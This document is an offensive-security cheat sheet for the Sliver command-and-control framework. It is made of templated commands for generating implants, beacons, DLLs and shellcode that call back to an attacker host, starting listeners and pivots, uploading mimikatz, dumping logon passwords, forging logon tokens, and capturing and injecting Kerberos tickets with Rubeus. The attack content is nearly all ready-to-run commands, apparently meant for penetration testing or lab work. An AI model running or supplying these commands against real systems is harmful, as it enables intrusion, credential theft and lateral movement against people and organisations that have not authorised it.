# Sliver

> Sliver C2 framework: generate implants/beacons, start listeners, pivot, and run post-exploitation modules (mimikatz, Rubeus, token forging).

<!-- tags: c2, sliver, implant, beacon, listener, pivot, mimikatz, rubeus, kerberos, post-exploit -->

---

## start sliver server
Start the Sliver team server.

```bash
sliver server
```

<!-- meta: risk=med | phase=post | tags=sliver,server,setup -->

---

## start sliver client
Connect the Sliver client to the team server.

```bash
sliver client
```

<!-- meta: risk=low | phase=post | tags=sliver,client,setup -->

---

## generate sliver implant transport os name
Build a Sliver implant for the chosen transport (mtls/http/tcp-pivot), OS, and name. `--skip-symbols` shrinks the binary at the cost of debug info.

```bash
generate --{{TYPE:str:mtls}} {{LHOST:ip}}:{{LPORT:port:443}} --os {{OS:str:windows}} -N {{NAME:str:win}} {{TEMPLATE:str:--skip-symbols}}
```

<!-- meta: risk=high | phase=exploit | tags=sliver,generate,implant,mtls -->

---

## generate sliver windows dll shared library
Build a Windows DLL / shared-library implant over mTLS.

```bash
generate --format shared --mtls {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=sliver,generate,dll,shared,mtls -->

---

## generate sliver windows shellcode
Build Windows shellcode over mTLS for in-memory injection.

```bash
generate --format shellcode --mtls {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=sliver,generate,shellcode,mtls -->

---

## generate sliver mtls beacon
Build a Sliver beacon implant (asynchronous check-in) over mTLS.

```bash
generate beacon --mtls {{LHOST:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=sliver,generate,beacon,mtls -->

---

## generate sliver implant dns canary
Build an mTLS implant with a DNS canary that alerts you if the binary is detonated in a sandbox.

```bash
generate --mtls {{LHOST:ip}} --canary {{CANARY_DOMAIN:str:canary.example.com}}
```

<!-- meta: risk=high | phase=exploit | tags=sliver,generate,canary,dns -->

---

## generate sliver implant execution limits
Build an implant restricted to a hostname, username, and domain-joined systems to avoid detonating off-target.

```bash
generate --mtls {{LHOST:ip}} --limit-hostname {{RHOST_NAME:str:WORKSTATION01}} --limit-username {{USER:str:Administrator}} --limit-domainjoined
```

<!-- meta: risk=high | phase=exploit | tags=sliver,generate,opsec,limits -->

---

## start sliver tcp pivot on implant
Open a TCP pivot listener on the active implant so other implants can callback through it to reach the C2.

```bash
pivot start {{RHOST_IP:ip}}:{{LPORT:port:9001}}
```

<!-- meta: risk=high | phase=post | tags=sliver,pivot,tcp,lateral -->

---

## upload tool into sliver session
Upload a local tool straight into the active implant session.

```bash
upload {{TOOL:file:/opt/windows-tools/mimikatz.exe}}
```

<!-- meta: risk=high | phase=post | tags=sliver,upload,tool,implant -->

---

## start sliver mtls listener
Start an mTLS listener for implant callbacks.

```bash
mtls --lhost {{LHOST:ip}} --lport {{LPORT:port:443}}
```

<!-- meta: risk=med | phase=post | tags=sliver,listener,mtls -->

---

## start sliver http listener
Start an HTTP listener for implant callbacks.

```bash
http --lhost {{LHOST:ip}} --lport {{LPORT:port:80}}
```

<!-- meta: risk=med | phase=post | tags=sliver,listener,http -->

---

## start sliver https listener
Start an HTTPS listener for implant callbacks.

```bash
https --lhost {{LHOST:ip}} --lport {{LPORT:port:443}}
```

<!-- meta: risk=med | phase=post | tags=sliver,listener,https -->

---

## list sliver jobs
List active Sliver listener jobs.

```bash
jobs
```

<!-- meta: risk=low | phase=post | tags=sliver,jobs,enum -->

---

## list sliver sessions
List active interactive sessions.

```bash
sessions
```

<!-- meta: risk=low | phase=post | tags=sliver,sessions,enum -->

---

## list sliver beacons
List active beacons.

```bash
beacons
```

<!-- meta: risk=low | phase=post | tags=sliver,beacons,enum -->

---

## use sliver session
Interact with a specific session by ID.

```bash
use {{SESSION_ID:str:SESSION_ID}}
```

<!-- meta: risk=low | phase=post | tags=sliver,session,interact -->

---

## run shell command in sliver session
Run a shell command in the active session.

```bash
shell {{COMMAND:str:whoami /all}}
```

<!-- meta: risk=high | phase=post | tags=sliver,shell,command -->

---

## download file from sliver target
Download a file from the target through the active session.

```bash
download {{REMOTE_FILE:str:C:\Users\Administrator\Desktop\flag.txt}}
```

<!-- meta: risk=med | phase=post | tags=sliver,download,exfil -->

---

## run mimikatz via sliver implant
Run a mimikatz command through the implant's built-in module (e.g. dump logon passwords, DPAPI, SAM/LSA secrets).

```bash
mimikatz {{MIMICOMMANDS:str:sekurlsa::logonpasswords}}
```

<!-- meta: risk=high | phase=post | tags=sliver,mimikatz,credentials,dump -->

---

## forge logon token sliver make-token
Forge a logon token from cleartext credentials. Use `.` as domain for local accounts; pick the LOGON_* type matching the target service.

```bash
make-token -d {{DOMAIN:str:CORP.LOCAL}} -u {{USER:str:Administrator}} -p '{{PASS:str:Password123}}' --logon-type {{LOGON_TYPE:str:LOGON_NEW_CREDENTIALS}}
```

<!-- meta: risk=high | phase=post | tags=sliver,token,credentials,impersonate -->

---

## rubeus monitor coerced machine tgt filtered
Run Rubeus monitor through the implant, filtering on the coerced machine account so you only catch the target's TGT.

```bash
rubeus -t 30 -- monitor /interval:{{INTERVAL:int:5}} /runfor:{{RUNFOR:int:60}} /filteruser:{{RHOST_NAME:str:DC01}}$ /nowrap
```

<!-- meta: risk=high | phase=post | tags=sliver,rubeus,kerberos,coerce,tgt -->

---

## rubeus monitor inbound tgt unfiltered
Run Rubeus monitor unfiltered, catching every TGT that lands on the host (noisier output).

```bash
rubeus -t 30 -- monitor /interval:{{INTERVAL:int:5}} /runfor:{{RUNFOR:int:60}} /nowrap
```

<!-- meta: risk=high | phase=post | tags=sliver,rubeus,kerberos,tgt -->

---

## rubeus ptt inject base64 ticket
Inject a base64 Kerberos ticket into the current process via Rubeus running through the implant.

```bash
rubeus -i -- ptt /ticket:{{TICKET:str:base64_ticket_here}}
```

<!-- meta: risk=high | phase=post | tags=sliver,rubeus,kerberos,ptt,inject -->

---

## rubeus dump tickets lsa session
Dump all Kerberos tickets in the current LSA session.

```bash
rubeus dump /nowrap
```

<!-- meta: risk=high | phase=post | tags=sliver,rubeus,kerberos,dump,tickets -->
